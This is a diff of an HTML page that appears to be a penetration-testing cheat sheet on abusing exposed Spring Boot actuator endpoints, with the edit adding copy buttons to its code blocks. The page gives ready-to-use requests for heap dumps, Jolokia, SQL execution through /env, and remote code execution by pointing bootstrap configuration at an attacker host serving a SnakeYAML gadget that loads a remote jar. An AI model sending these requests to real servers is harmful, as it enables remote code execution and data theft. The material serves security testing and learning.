@@ -396,47 +396,70 @@ authentication.</p>
 </ul>
 <p>For instance, it's possible to <a href="https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/actuator-api/html/#heapdump" target="_blank">dump the heap memory</a>
 of the server:</p>
-<pre><code class="language-none">https://&lt;host&gt;/path/actuator/heapdump
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">https://&lt;host&gt;/path/actuator/heapdump
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="https://&lt;host&gt;/path/actuator/heapdump
+">    Copy  </button></div></div>
 <p>A brute-force list can be found here: <a href="/assets/spring_boot.txt">spring_boot.txt</a></p>
 <h2 id="jolokia">Jolokia</h2>
 <p>An other Sping Boot endpoint is <code>jolokia</code>. It allow the user to perform the same
 actions as the JMX.</p>
-<pre><code class="language-none">https://&lt;host&gt;/path/jolokia/list
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">https://&lt;host&gt;/path/jolokia/list
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="https://&lt;host&gt;/path/jolokia/list
+">    Copy  </button></div></div>
 <p>It can be used to perform remote code execution.</p>
 <h2 id="env">Env</h2>
 <p>The <code>/env</code> endpoint allows to update the Spring Boot environmental properties.
 It's possible to execute SQL commands:</p>
-<pre><code class="language-none">POST /env HTTP/1.1
+<div class="clipboard-content">  <pre><code class="language-none">POST /env HTTP/1.1
 Host: &lt;host&gt;
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 
 spring.datasource.tomcat.validationQuery=&lt;sql cmd&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="POST /env HTTP/1.1
+Host: &lt;host&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+spring.datasource.tomcat.validationQuery=&lt;sql cmd&gt;
+">    Copy  </button></div></div>
 <p>Also, it's possible to update the <code>env</code> to execute code with the properties:
 <code>spring.cloud.bootstrap.location</code> which is used to load external configuration file:</p>
-<pre><code class="language-none">POST /env HTTP/1.1
+<div class="clipboard-content">  <pre><code class="language-none">POST /env HTTP/1.1
 Host: &lt;host&gt;
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 
 spring.cloud.bootstrap.location=http://&lt;attacker&gt;/malicious-config-file.yml
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="POST /env HTTP/1.1
+Host: &lt;host&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+spring.cloud.bootstrap.location=http://&lt;attacker&gt;/malicious-config-file.yml
+">    Copy  </button></div></div>
 <p>The malicious configuration file can be:</p>
-<pre><code class="language-none">!!javax.script.ScriptEngineManager [
+<div class="clipboard-content">  <pre><code class="language-none">!!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
     !!java.net.URL [&quot;http://&lt;attacker&gt;/malicious.jar&quot;]
   ]]
 ]
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://&lt;attacker&gt;/malicious.jar&quot;]
+  ]]
+]
+">    Copy  </button></div></div>
 <p>You need to refresh the configuration:</p>
-<pre><code class="language-none">POST /refresh HTTP/1.1
+<div class="clipboard-content">  <pre><code class="language-none">POST /refresh HTTP/1.1
 Host: &lt;host&gt;
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="POST /refresh HTTP/1.1
+Host: &lt;host&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+">    Copy  </button></div></div>
             
           </div>
           <footer>
